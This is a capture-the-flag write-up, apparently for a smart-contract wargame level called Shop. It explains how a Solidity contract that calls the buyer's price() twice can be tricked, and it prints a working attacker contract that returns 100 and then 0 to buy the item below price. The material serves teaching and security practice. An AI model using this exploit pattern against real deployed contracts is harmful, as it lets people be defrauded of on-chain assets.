# Task

Сan you get the item from the shop for less than the price asked?

# Contract

```sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Buyer {
    function price() external view returns (uint256);
}

contract Shop {
    uint256 public price = 100;
    bool public isSold;

    function buy() public {
        Buyer _buyer = Buyer(msg.sender);

        if (_buyer.price() >= price && !isSold) {
            isSold = true;
            price = _buyer.price();
        }
    }
}
```
The contract, `Shop`, allows an external contract implementing the `Buyer` interface to buy an item if the buyer's price meets or exceeds the item's price and the item is not already sold.

- **`price`**: Initial price set to 100.
- **`isSold`**: Tracks if the item is sold.
- **`buy()` function**: Checks if the buyer's `price()` (from the external `Buyer` contract) is equal to or higher than the current price and if the item is not sold. If true, the item is marked as sold, and the price is updated to the buyer's price.

The contract is intended for interaction with a `Buyer` contract that returns a price.

Let me explain the condition again

```sol
if (_buyer.price() >= price && !isSold) {
            isSold = true;
            price = _buyer.price();
        }
```
For the first condition to evaluate as true, the initial call to the `price()` function must return a value greater than or equal to the current `price`. Afterward, the function is called again within the block, and the `price` is updated accordingly.

So summary of what we need to do is 

1. set `isSold` to true
2. set `price` < 100

Below is the attack contract

```sol
//SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

import "./shop.sol";

contract shopAttack is Buyer{
    Shop public buyer;

    constructor(address _targetaddr) {
        buyer = Shop(_targetaddr);
    }

    function buy() public {
        buyer.buy();
    }

    function price() public view override returns(uint) { 
        if (buyer.isSold()) {
            return 0;
        } else {
            return 100;
        }

        // the if statement can be written in a shorter form
        // return buyer.isSold() ? 0 :100;
    }
}


}
```
Explaining this attack contract

- **`buyer`**: An instance of the `Shop` contract, passed in during deployment.
- **`buy()`**: Calls the `buy()` function in the `Shop` contract.
- **`price()`**: Overrides the `price()` function from the `Buyer` interface. It returns `100` before the item is sold and `0` after the item is sold. This allows it to pass the condition to buy the item by pretending to match the price (100), then once `isSold` is true, it returns `0` to finalize the transaction at a lower price.


Lets deploy the attack contract using forge

![image](https://github.com/user-attachments/assets/855d39bb-f7ed-4c31-8725-27afc906aa51)

We've successfully compiled the attack contract and we got the contract address to be `0xb1b1d2b475d99c93d6D1c7AD1303B3C3a1BF134f`

Lets start out by calling the `price()` function in the attack contract

![image](https://github.com/user-attachments/assets/c9cc99f1-8ee7-4cfd-8898-3810f1d7b562)

We have the value of `100`

To pass the conditional statement, we'll call the `buy()` function

![image](https://github.com/user-attachments/assets/059061ca-7da0-4004-9f70-565e56dcbaea)

Now, lets call the `price()` function again

![image](https://github.com/user-attachments/assets/17e15167-c75a-479b-91bf-b012223d9a4a)

Our price already reset to zero

Submitting the instance

![image](https://github.com/user-attachments/assets/9fb3c454-c19b-4662-9014-fd5990399aac)

We have successfully completed this level

-------------------------

Till Next Time :xD























